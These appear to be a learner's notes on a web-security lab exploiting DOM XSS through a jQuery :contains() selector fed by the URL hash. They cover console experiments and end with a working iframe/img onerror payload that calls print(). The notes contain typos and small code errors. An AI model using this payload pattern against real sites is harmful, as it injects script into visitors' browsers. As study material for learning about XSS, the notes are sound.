DOM XSS in JQuery Selector

var post = $('section.blog-list h2:contains('+ decodeURIComponent(window.location.hash.slice(1)) + ')');
 searches for h2 element that contains the string that is provided as the argument 
.slice(1) removes the first element for example window.location.hash is #123 and slice(1) makes the string acts as a array and provides values after the hash
if the element post exists it scrolls the element into view
changing the hash value to #Game it jumps to the h2 element the contains the element

Vulenerabilty with J Query 
We have control over the argument in J Query
(currently patched)

Going into console
 calling  $('section.blog-list h2:contains(Game)') aka hard coding 
  result is a J Quert object with a lenght property of 1 means 1 mthc
  can expose DOM using var post = $ $('section.blog-list h2:contains
  post.get(0);
  we can see the DOM element exposed 

  using a search term that does not exist
  var post = $('section.blog-list h2:contains(Gme)')
  post;
  we can see that it doesn;t have any mathches but it returns J Quert object with lenght 0 
  if(post) (console.log('true'))
  prints true as it exists
  post.get(0); print undefined as it lenght is 0 

Finding the Vulnerabilty 
  var post  = $('section.blog-list h2:contains(<h1>Wildsh0ck</h1>)') using tags as parameters
  checking post;
  we appear to have a match but its not possible as the text wildsh0ck doesn't exist
  we can check the DOM element using post.ge(0);
  we get a h1 element which contains our text 
  meaning it created a DOM element
  But this is not on the page as in the properties of the DOM element and the parent element is NULL 
  meaning its not attached 
  so we can re-assign 
  post = post.get(0);
  lets attach it to a DOM with attatching a parent
  Using element academyLabHeader
  var mynode = document.getElementID('academyLabHeader')
  print mynode will result in <div id='academyLabHeader')
  mynode.appendChild(post);
  and we can see the we appended the text wildsh0ck to the main page
  J Query is creating a DOM in the background 
  let myimage = document.createElement('img')
  myimg; will print dom node with image tag
  myimg.src = 0 so 0 as source will error out
  a HTTP req as been requested with 404 error 
  a subsequent HTTP req has been sent looking for the image

Creating the actual payload 
 using iframe to embed another html document within the current webpage
 <iframe src = "https://attacklab.net/#" onload = this.src+= '<img src =x onerror= print()>'"></iframe>
 this payload opens the print page pop up
